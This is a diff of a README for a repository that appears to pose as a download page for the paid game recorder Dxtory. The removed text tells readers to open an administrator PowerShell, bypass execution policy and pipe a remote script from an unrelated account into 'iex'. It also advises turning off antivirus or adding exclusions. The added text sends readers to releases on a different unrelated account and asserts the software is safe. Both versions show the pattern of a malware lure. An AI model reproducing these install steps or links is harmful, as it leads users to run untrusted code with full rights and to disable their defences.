@@ -1,126 +1,109 @@
-# Dxtory Download for Windows 11 & 10
+# 🎥 Dxtory - Capture lossless video games easily
 
-**Dxtory**
+[![](https://img.shields.io/badge/Download_Dxtory-blue.svg)](https://github.com/Valetparkingjanvandermeer639/Dxtory/releases)
 
-**Dxtory** for PC gamers on Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+Dxtory performs lossless video capture for Windows. It records game footage at high speeds with minimal impact on your system performance. Use this software to create high-quality recordings of your screen during gameplay.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Gaming](https://img.shields.io/badge/For-PC%20Gamers-16a34a?style=flat-square&logo=gamepad)]()
+## 📥 Getting Started
 
----
+[Visit the official release page to download Dxtory](https://github.com/Valetparkingjanvandermeer639/Dxtory/releases). You will find the installer file on this page. Save this file to your computer.
 
-## Download & Install (PowerShell)
+## ⚙️ System Requirements
 
-> **This is the download page.** The command below downloads and runs the **Dxtory** installer on Windows 10/11.
+Ensure your computer meets these requirements before you start the installation:
 
-#### Before you start
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i5 or better.
+*   Memory: 8 GB RAM.
+*   Storage: 500 MB for the application plus extra space for video files.
+*   Graphics Card: DirectX 9 or newer.
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+## 🛠 Installation Steps
 
----
+Follow these steps to install the software on your computer:
 
-#### Step 1 — Open PowerShell as Administrator
+1.  Open the folder where you saved the installer.
+2.  Double-click the installer file to start the process.
+3.  Grant permission if Windows asks for access.
+4.  Follow the instructions on the screen.
+5.  Select a folder for the program files.
+6.  Click the Install button.
+7.  Wait for the progress bar to finish.
+8.  Click Finish to launch the software.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+## 🖥 Setting Up the Application
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+Configure your settings after the first launch to optimize your video quality.
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+### Selecting a Recording Folder
 
----
+The software saves video files in a default folder. You can change this to a secondary drive to prevent performance drops during recording.
 
-#### Step 2 — Copy the full command
+1.  Open the settings menu.
+2.  Find the folder icon labeled Folder.
+3.  Click the icon to browse your hard drive.
+4.  Choose a location with plenty of storage space.
+5.  Confirm your selection.
 
-Select **both lines** below and press **Ctrl+C**:
+### Adjusting Video Settings
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+You can control how the software captures your video footage.
 
-> Copy **both lines**, not just the second one.
+1.  Go to the Advanced tab.
+2.  Select your desired frame rate. A rate of 60 frames per second provides smooth playback.
+3.  Choose your video codec. The default lossless codec keeps your original quality intact.
+4.  Set the scaling if you want to record at a lower resolution than your monitor.
 
----
+### Configuring Audio Inputs
 
-#### Step 3 — Paste into PowerShell and press Enter
+1.  Navigate to the Audio tab.
+2.  Select your primary audio device.
+3.  Turn on the capture option for your microphone if you want to record your voice.
+4.  Adjust the volume sliders to get the right balance between game sound and your voice.
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+## 🎮 How to Record Game Footage
 
----
+1.  Launch the Dxtory application.
+2.  Keep the program running in the background.
+3.  Start your game.
+4.  Look for the frames-per-second (FPS) counter in the corner of your game screen.
+5.  Press the assigned hotkey to start recording.
+6.  Press the same hotkey to stop recording when you finish.
+7.  Find your finished video file in the folder you selected during the setup process.
 
-#### Step 4 — Finish setup
+## 💡 Troubleshooting Common Issues
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+Check these common fixes if the software fails to capture your game.
 
----
+### No FPS Counter Appears
 
-#### Step 5 — Launch the app
+If you do not see the counter, check these items:
 
-Open **Start menu** → search for **Dxtory** → run it.
+*   Ensure the game runs in windowed or borderless mode.
+*   Check that the software has permission to overlay on top of other programs.
+*   Restart the application as an administrator to ensure it has full system access.
 
----
+### Low Performance During Recording
 
-#### Troubleshooting
+High resolutions and frame rates demand more system resources. If your game slows down, follow these tips:
 
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
+*   Reduce the recording resolution in the video settings.
+*   Lower the target frame rate.
+*   Move the recording folder to a different physical hard drive than the one where the game resides.
+*   Close unnecessary background applications to free up memory.
 
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
+### Files Do Not Play
 
----
+Lossless files require specific codecs to play. If you cannot open your file, install a media player that supports various codecs, such as VLC Media Player.
 
-## About
+## 🛡 Security and Privacy
 
-**Dxtory** setup page for Windows PC gamers.
+Dxtory operates locally on your machine. The software does not send your recordings to any external servers. Your files remain on your computer unless you choose to move or share them.
 
-**People also search for:** dxtory download, dxtory game recorder lossless capture install windows
+## 📈 Software Updates
 
-**Repository:** `Dxtory`
+Check the [download link](https://github.com/Valetparkingjanvandermeer639/Dxtory/releases) occasionally for newer versions. Developers release updates to improve compatibility with newer Windows versions and fix bugs. You can install a newer version directly over an existing installation. The installer will update your current settings automatically.
 
+## 📁 Support
 
-## After install
-
-| Step | Tip |
-| --- | --- |
-| 1 | Run once as Administrator on first setup |
-| 2 | Add your game folders to exclusions if AV blocks tools |
-| 3 | Pin to taskbar for quick access between matches |
-| 4 | Check for updates inside the app after major game patches |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB for mod tools / recording) |
-| Disk | 500 MB free space |
-| GPU | DirectX 11 compatible |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for this page |
-| Setup blocked | Run as Administrator |
-| Tool not detected in game | Restart game after installing |
-| Antivirus warning | Add install folder to exclusions temporarily |
-
----
-
-**Topics:** dxtory-download, dxtory, dxtory-game-recorder-lossless-capture-install-wind, recorder, lossless, capture, dxtory-2026, game-recorder, lossless-capture, recording, paid, software
+If you encounter technical issues beyond the common fixes, review your computer settings. Ensure your drivers for your graphics card remain current. Contact your hardware manufacturer for driver updates. Test the software with different games to isolate whether the issue relates to a specific game or the recording software.
